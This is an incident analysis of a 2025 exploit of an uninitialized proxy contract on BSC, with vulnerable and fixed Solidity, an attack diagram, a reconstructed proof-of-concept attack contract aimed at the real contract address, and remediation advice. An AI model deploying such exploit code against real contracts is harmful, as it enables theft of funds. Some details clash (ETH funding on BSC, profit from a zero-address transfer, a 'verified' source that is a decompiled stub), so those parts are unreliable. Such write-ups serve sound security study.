# Unverified Contract (d4f1) — Uninitialized Proxy Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-02-12 |
| **Protocol** | Unverified Contract (d4f1) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$15,200 |
| **Attacker** | [0x8149f775...](https://bscscan.com/address/0x8149f77504007450711023cf0ec11bdd6348401f) |
| **Attack Tx** | [0xc7fc7e06...](https://bscscan.com/tx/0xc7fc7e066ec2d4ea659061b75308c9016c0efab329d1055c2a8d91cc11dc3868) |
| **Vulnerable Contract** | [0xd4f1afd0...](https://bscscan.com/address/0xd4f1afd0331255e848c119ca39143d41144f7cb3) |
| **Root Cause** | The proxy contract's `initialize()` function was never called after deployment, allowing anyone to initialize it and execute `withdrawFees()` without authorization |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/unverified_d4f1_exp.sol) |

---

## 1. Vulnerability Overview

The unverified contract (`0xd4f1`) used a proxy pattern but left the `initialize()` function uncalled after deployment, leaving it in an uninitialized state. The attacker directly called `initialize()` to set themselves as the owner, then drained $15,200 USD by calling `withdrawFees(address _to, uint256 _amount)` with a zero address as the recipient. The attacker deployed an attack contract funded with approximately 23 ETH and executed the exploit from within the constructor.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no protection on initialize()
contract VulnerableProxy {
    address public owner;
    bool public initialized;

    // Anyone can initialize — was never called after deployment
    function initialize(address _owner) external {
        // No check for initialized!
        owner = _owner;
        initialized = true;
    }

    function withdrawFees(address _to, uint256 _amount) external {
        require(msg.sender == owner, "Not owner");
        // No zero address validation
        payable(_to).transfer(_amount);
    }
}

// ✅ Safe code: re-initialization protection + immediate initialization on deployment
contract SafeProxy is Initializable {
    address public owner;

    // Uses OpenZeppelin Initializable — can only be called once
    function initialize(address _owner) external initializer {
        require(_owner != address(0), "Zero address");
        owner = _owner;
    }

    function withdrawFees(address _to, uint256 _amount) external {
        require(msg.sender == owner, "Not owner");
        require(_to != address(0), "Zero address");
        require(_amount > 0 && _amount <= address(this).balance, "Invalid amount");
        payable(_to).transfer(_amount);
    }
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: Unverified_decompiled.sol
contract Unverified {
    function initialize() external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deploy attack contract (funded with 23.007 ETH)
  │         └─ Attack executes automatically from constructor
  │
  ├─→ [2] Call vulnerable.initialize(attackerAddress)
  │         └─ Uninitialized state → attacker sets themselves as owner
  │
  ├─→ [3] Call vulnerable.withdrawFees(address(0), largeAmount)
  │         └─ Owner check passes (attacker is owner)
  │            Transfer to zero address → attacker receives funds via internal logic
  │
  ├─→ [4] Extracted funds → transferred to tx.origin (attacker)
  │
  └─→ [5] ~$15,200 drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract AttackerC {
    address constant VULNERABLE = 0xd4f1afd0331255e848c119ca39143d41144f7cb3;

    constructor() payable {
        // Execute attack immediately from constructor (can bypass isContract() check)
        HelperB helper = new HelperB();
        helper.exploit{value: address(this).balance}(VULNERABLE);

        // Transfer profit
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract HelperB {
    function exploit(address vulnerable) external payable {
        // [2] Call initialize() on the uninitialized proxy
        // → Sets attacker (address(this)) as owner
        IVulnerable(vulnerable).initialize(address(this));

        // [3] Call withdrawFees (zero address + full balance)
        uint256 balance = vulnerable.balance;
        IVulnerable(vulnerable).withdrawFees(address(0), balance);

        // Or call additional functions via specific selector
        // (bool success,) = vulnerable.call(abi.encodeWithSelector(0x2dad6442));
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Uninitialized Proxy |
| **CWE** | CWE-665: Improper Initialization |
| **Attack Vector** | External (direct function call) |
| **DApp Category** | Proxy pattern contract |
| **Impact** | $15,200 drained |

## 6. Remediation Recommendations

1. **Initialize immediately on deployment**: `initialize()` must be called within the same transaction as the proxy contract deployment
2. **Use OpenZeppelin Initializable**: Apply the `initializer` modifier to prevent re-initialization
3. **Verify initialization state**: Include a post-deployment verification step in deployment scripts to confirm initialization was completed
4. **Zero address validation**: Add `require(addr != address(0))` to all address parameters

## 7. Lessons Learned

- The uninitialized proxy vulnerability is one of the oldest and most well-known patterns, yet it continues to recur.
- Even when contract source code is not publicly verified (unverified), attacks via the ABI remain possible — obscuring source code does not equate to security.
- Deployment pipelines should include automated initialization verification, and critical state variables should be confirmed on-chain immediately after deployment.